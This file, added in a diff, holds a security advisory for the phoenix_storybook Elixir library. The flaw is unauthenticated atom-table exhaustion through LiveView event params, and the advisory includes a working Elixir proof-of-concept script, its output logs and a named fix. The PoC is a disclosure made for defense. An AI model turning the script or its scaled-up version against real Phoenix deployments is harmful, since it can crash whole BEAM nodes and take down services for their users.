@@ -1,0 +1,116 @@
+---
+description: |-
+  ### Summary
+  An attacker who can deliver `psb-assign`, `psb-toggle`, `psb-set-theme`, `upper-tab-navigation`, `lower-tab-navigation`, `playground-change`, or `playground-toggle` LiveView events to a mounted Phoenix Storybook playground can flood the BEAM atom table with attacker-controlled strings, permanently leaking atoms until the VM hits its ~1,048,576 atom ceiling and crashes the entire node. No authentication is required beyond being able to reach the storybook route.
+  
+  Tabs parsing was introduced in https://github.com/phenixdigital/phoenix_storybook/commit/0228669d55c23a754d1ef11f49a32121129d5395
+  
+  ### Details
+  `PhoenixStorybook.Story.Playground` and `PhoenixStorybook.ExtraAssignsHelpers` converts user-supplied event params into atoms without checking whether the atoms already exist:
+  
+  - `handle_set_variation_assign/3` (`lib/phoenix_storybook/helpers/extra_assigns_helpers.ex:59`) iterates the event params map and calls `String.to_atom/1` on every key.
+  - `handle_toggle_variation_assign/3` (line 73) calls `String.to_atom/1` on the `"attr"` value supplied by the client.
+  - `to_variation_id/2` (lines 90, 93) calls `String.to_atom/1` on each element of `"variation_id"`.
+  - `to_value/4` (lines 106, 107) calls `String.to_atom/1` on the raw string value for any attribute declared as `:atom` or `:boolean`.
+  
+  The existing guards do not help: `check_type!/3` for `:boolean` inspects the atom *after* `String.to_atom/1` has already interned it, so the leak has already happened. The `:atom` branch only checks `is_atom/1`, which is trivially true for the atom that was just created. Atoms in the BEAM are never garbage-collected, so each unique attacker string is a permanent leak; once the atom table fills, the VM aborts.
+  
+  The fix is to use `String.to_existing_atom/1` (with a rescue that rejects unknown names) or, better, to look the attribute / variation up in the declared `story.attributes()` / variation registry and reuse the atom from there.
+  
+  ### PoC
+  The attached script focuses on only the first class of parameters. It encodes the threat model of an outside attacker who can deliver `psb-assign` events to a mounted storybook playground LiveView. LiveView event handlers route those params into the public helper `PhoenixStorybook.ExtraAssignsHelpers.handle_set_variation_assign/3` (see `lib/phoenix_storybook/live/story/playground_preview_live.ex`), so the script calls that helper directly with attacker-shaped params — a stub `FakeStory` providing an empty `attributes/0` list and a single `:default` variation, plus an `extra_assigns` map keyed by `{:single, :default}`.
+  
+  Each simulated request is a params map with 5,000 unique keys of the form `"psb_evil_<nonce>_<r>_<i>"`. Because the helper does `for {key, value} <- params, ..., do: {String.to_atom(key), ...}`, every distinct key is interned as a brand-new permanent atom. The script issues 5 such requests for 25,000 atoms total — modest on purpose so the script finishes quickly; raising either loop bound walks the process straight into `:erlang.system_info(:atom_limit)` and crashes the VM.
+  
+  The script measures `:erlang.system_info(:atom_count)` before and after, prints the delta and the atom limit, and prints `VERIFIED: …` when the delta is at least `requests * attrs_per_request` (i.e. 25,000), proving that each attacker-controlled string became a permanent atom. No authentication is required by the helper itself — only the ability to reach the storybook route and emit the event.
+  
+  The full script is attached below under "Scripts and Logs".
+  
+  ### Impact
+  Unauthenticated denial-of-service via atom-table exhaustion against any Phoenix application that mounts Phoenix Storybook (1.0.0) on a network-reachable route. A single sustained stream of `psb-assign` / `psb-toggle` events with unique keys is enough to crash the entire BEAM node, taking down every application running on it — not just the storybook. The only precondition is reachability of the storybook LiveView; many deployments expose it in staging/preview environments or, by misconfiguration, in production.
+  
+  ## Scripts and Logs
+  
+  ```elixir
+  # Verifies: Unbounded atom creation from LiveView event params (atom-table DoS)
+  #
+  # Run with:
+  #   elixir unbounded_atom_creation_from_liveview_event_params_atom_tabl_1350.exs
+  #
+  # Threat model: an outside attacker who can deliver `psb-assign` events to a
+  # mounted storybook view supplies attacker-controlled param maps. The library's
+  # public helper `PhoenixStorybook.ExtraAssignsHelpers.handle_set_variation_assign/3`
+  # is the documented entry point that LiveView event handlers feed those params
+  # into (see lib/phoenix_storybook/live/story/playground_preview_live.ex). The
+  # helper interns every key of `params` with `String.to_atom/1`, so unique
+  # attacker strings each create a permanent atom.
+  
+  Mix.install([{:phoenix_storybook, "1.0.0"}])
+  
+  alias PhoenixStorybook.ExtraAssignsHelpers
+  alias PhoenixStorybook.Stories.Variation
+  
+  defmodule FakeStory do
+    def attributes, do: []
+    def variations, do: [%Variation{id: :default, attributes: %{}}]
+  end
+  
+  extra_assigns = %{{:single, :default} => %{}}
+  
+  # Each request from the attacker is one params map. Use 5_000 unique attribute
+  # names per request, across 5 requests = 25_000 distinct atoms permanently
+  # leaked. (Kept modest so the script finishes quickly; raise to crash the VM.)
+  nonce = System.unique_integer([:positive])
+  requests = 5
+  attrs_per_request = 5_000
+  
+  before_count = :erlang.system_info(:atom_count)
+  
+  for r <- 1..requests do
+    attacker_params =
+      for i <- 1..attrs_per_request, into: %{"variation_id" => "default"} do
+        {"psb_evil_#{nonce}_#{r}_#{i}", "x"}
+      end
+  
+    ExtraAssignsHelpers.handle_set_variation_assign(attacker_params, extra_assigns, FakeStory)
+  end
+  
+  after_count = :erlang.system_info(:atom_count)
+  delta = after_count - before_count
+  
+  IO.puts("atom_count before: #{before_count}")
+  IO.puts("atom_count after:  #{after_count}")
+  IO.puts("delta:             #{delta}")
+  IO.puts("atom_limit:        #{:erlang.system_info(:atom_limit)}")
+  
+  expected = requests * attrs_per_request
+  
+  if delta >= expected do
+    IO.puts(
+      "VERIFIED: handle_set_variation_assign/3 interned #{delta} attacker-controlled strings as permanent atoms (limit #{:erlang.system_info(:atom_limit)}); a sustained flood exhausts the atom table and crashes the BEAM."
+    )
+  else
+    IO.puts("NOT VERIFIED: only #{delta} new atoms created (expected >= #{expected})")
+  end
+  
+  ```
+  
+  ### Logs
+  
+  ```logs
+  atom_count before: 26341
+  atom_count after:  51361
+  delta:             25020
+  atom_limit:        1048576
+  VERIFIED: handle_set_variation_assign/3 interned 25020 attacker-controlled strings as permanent atoms (limit 1048576); a sustained flood exhausts the atom table and crashes the BEAM.
+  ```
+disclosure_date: 2026-06-09
+first_patched_versions:
+  - 1.1.0
+id: GHSA-833p-95jq-929q
+link: https://github.com/advisories/GHSA-833p-95jq-929q
+package: phoenix_storybook
+severity: high
+title: 'PhoenixStorybook: Unbounded atom creation from LiveView event params (atom-table DoS)'
+vulnerable_version_ranges:
+  - '>= 0.2.0, < 1.1.0'
